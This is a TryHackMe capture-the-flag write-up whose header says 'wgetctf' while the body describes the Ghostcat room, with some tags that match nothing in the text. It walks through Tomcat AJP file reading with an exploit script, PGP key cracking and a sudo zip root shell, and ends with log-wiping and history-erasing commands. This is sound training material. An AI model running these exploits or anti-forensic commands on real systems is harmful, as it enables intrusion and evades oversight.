---
title: "THM:wgetctf"
subtitle: "TryHackMe CTF room: https://tryhackme.com/room/wgetctf"
category: "CTF"
tags: ctf,nmap,gobuster,dirbuster,session,broken-authentication,javascript,apache,ubuntu,john,gpg2john,linpeas,privesc,cron
---
# THM:wgetctf

URL: [https://tryhackme.com/room/wgetctf](https://tryhackme.com/room/wgetctf) [Easy]

Tags: 
<div style="margin-left: 5px;">
{% assign tags = page.tags | split: "," %}
{% for tag in tags %}
<a href="../search/?q={{tag}}" title="Click to search by this tag"><span class="badge bg-secondary">{{tag}}</span></a>
{% endfor %}
</div>
<hr>

## Reconnaissance

Description of the room:

> Can you exfiltrate the root flag?

## Scanning

### Running: `nmap`

Ran the following:

> `nmap -sC -sV x.x.x.x`

Interesting ports found to be open:

```python
PORT   STATE SERVICE REASON
22/tcp   open  ssh        OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 f3:c8:9f:0b:6a:c5:fe:95:54:0b:e9:e3:ba:93:db:7c (RSA)
|   256 dd:1a:09:f5:99:63:a3:43:0d:2d:90:d8:e3:e1:1f:b9 (ECDSA)
|_  256 48:d1:30:1b:38:6c:c6:53:ea:30:81:80:5d:0c:f1:05 (ED25519)
53/tcp   open  tcpwrapped
8009/tcp open  ajp13      Apache Jserv (Protocol v1.3)
| ajp-methods: 
|_  Supported methods: GET HEAD POST OPTIONS
8080/tcp open  http       Apache Tomcat 9.0.30
|_http-open-proxy: Proxy might be redirecting requests
|_http-title: Apache Tomcat/9.0.30
|_http-favicon: Apache Tomcat
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Also see: [nmap.log](nmap.log)

### Running: `gobuster`

Ran the following:

> `gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -u http://x.x.x.x`

Interesting folders found on `:8080`:

```python
/docs                 (Status: 302) [Size: 0] [--> /docs/]
/examples             (Status: 302) [Size: 0] [--> /examples/]
/manager              (Status: 302) [Size: 0] [--> /manager/]
```

Interesting folders found on `:8009`:

This one is odd. In a browser, it says:

```
This page isn’t working
10.10.58.18 didn’t send any data.
ERR_EMPTY_RESPONSE
```

Which seems like there is a web server there, but it just didn't respond with anything. However, over `http` and `https`, `gobuster` couldn't connect to the web server:

```python
Error: error on running gobuster: unable to connect to http://10.10.58.18:8009/: Get "http://10.10.58.18:8009/": EOF
```

Also see: [gobuster-8080.log](gobuster-8080.log) / [gobuster-8009.log](gobuster-8009.log)

### Running: `nikto`

Ran the following:

> `nikto -h x.x.x.x -p 8080`

Not much of anything interesting info found on `:8080`:

```python
+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ /favicon.ico: identifies this app/server as: Apache Tomcat (possibly 5.5.26 through 8.0.15), Alfresco Community. See: https://en.wikipedia.org/wiki/Favicon
+ OPTIONS: Allowed HTTP Methods: GET, HEAD, POST, PUT, DELETE, OPTIONS .
+ HTTP method ('Allow' Header): 'PUT' method could allow clients to save files on the web server.
+ HTTP method ('Allow' Header): 'DELETE' may allow clients to remove files on the web server.
+ /examples/servlets/index.html: Apache Tomcat default JSP pages present.
+ /examples/jsp/snp/snoop.jsp: Displays information about page retrievals, including other users. See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2004-2104
+ /manager/manager-howto.html: Tomcat documentation found. See: CWE-552
+ /manager/html: Default Tomcat Manager / Host Manager interface found.
+ /host-manager/html: Default Tomcat Manager / Host Manager interface found.
+ /manager/status: Default Tomcat Server Status interface found.
+ /host-manager/status: Default Tomcat Server Status interface found.
+ 8074 requests: 0 error(s) and 13 item(s) reported on remote host
```

Interesting info found on `:8009`:

Similar situation with `gobuster`, Nikto couldn't connect.

```python
- Nikto v2.5.0
---------------------------------------------------------------------------
---------------------------------------------------------------------------
+ 0 host(s) tested
```

Also see: [nikto-8080.log](nikto-8080.log) / [nikto-8009.log](nikto-8009.log)

## Gaining Access

I consulted [this writeup](https://medium.com/@sushantkamble/apache-ghostcat-cve-2020-1938-explanation-and-walkthrough-23a9a1ae4a23) which explains that "Ghostcat" (the name of the room) is the name of a vulnerability in Apache Jserv Protocol (AJP) that is running on port 8009.

### Unprivileged Access

By using the `ajpShooter.py` exploit from [here](https://github.com/00theway/Ghostcat-CNVD-2020-10487), we can run a command line like this:

```bash
python3 ajpShooter.py http://10.10.58.18:8080/demo 8009 /WEB-INF/web.xml read
```

That then shows you a plausible username:password combination. When you try that combination over SSH, you can get in with unprivileged access.

> ***Note:** Looking around there is a `merlin` folder until `/home/` with a readable folder structure. Not writable though. Also note that not much came up in linpeas either.*


## Privilege Escalation

This is somewhat tedious to put together. The kill-chain is:

1. **Download** the `credential.pgp` and `tryhackme.asc` to your local workstation (ex: run `python3 -m http.server` on the target, to serve those files; retrieve them with a browser)
1. **Convert** The `tryhackme.asc` file is a PGP private key. Run `gpg2john ./tryhackme.asc > ./tryhackme.asc.hash` to get it into John the Ripper format.
1. **Run John the Ripper** with the RockYou wordlist to crack the password for that private key (ex: run `john --wordlist=/opt/share/wordlist/rockyou.txt ./tryhackme.asc.hash`)
1. **Import that password into PGP** with: `gpg --import ./tryhackme.asc` - it will prompt you for a password.
1. **Decrypt the `credential.pgp` file** with `gpg --decrypt ./credential.pgp` - ir will prompt you for that same password you got from John the Ripper.
1. **SSH as `merlin`** Next, that credential that you just decrypted, is for `merlin`. So, SSH in now as `merlin`.
1. **Check `sudo`** As `merlin`, if we run `sudo -l` to see what we can do as sudo, we see that we can run `/usr/bin/zip`. This is notable because the `zip` program allows you to pass it a `--unzip-command "<command to run>"`. So, if we're running as `root` via `sudo` at that time, and if the `--unzip-command` opens a shell, we should get a root shell.

Putting that all together, we can finally run something like this, logged in as `merlin`:

```bash
sudo zip archive ./user.txt -T --unzip-command="sh -c /bin/bash"
```

We are now running as root and can get our final flag from the `/root/` folder.


## Clearing Tracks

This is a test machine. However, in a Red Team scenario, we could:

### Delete relevant logs from `/var/log/` - although that might draw attention.

> `rm -Rf /var/log/*`

### Search and replace our IP address in all logs via: 

> `find /var/log -name "*" -exec sed -i 's/10.10.2.14/127.0.0.1/g' {} \;`

### Wipe bash history for any accounts we used via: 

> `cat /dev/null > /root/.bash_history`
>  
> `cat /dev/null > /home/merlin/.bash_history`
>  
> `cat /dev/null > /home/skyfrick/.bash_history`

## Summary

Completed: [2023-07-22 21:25:01]